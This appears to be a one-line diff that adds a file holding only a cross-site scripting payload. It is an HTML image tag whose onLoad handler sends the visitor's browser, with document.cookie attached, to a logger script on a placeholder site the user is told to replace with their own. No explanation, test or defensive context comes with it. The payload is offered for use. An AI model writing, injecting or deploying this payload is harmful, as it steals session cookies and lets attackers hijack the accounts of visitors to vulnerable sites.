@@ -1,0 +1,1 @@
+<img src="linkToAnImage" onLoad='javascript:document.location="www.ChangeToYourSite.com/logger.php?" + document.cookie'>
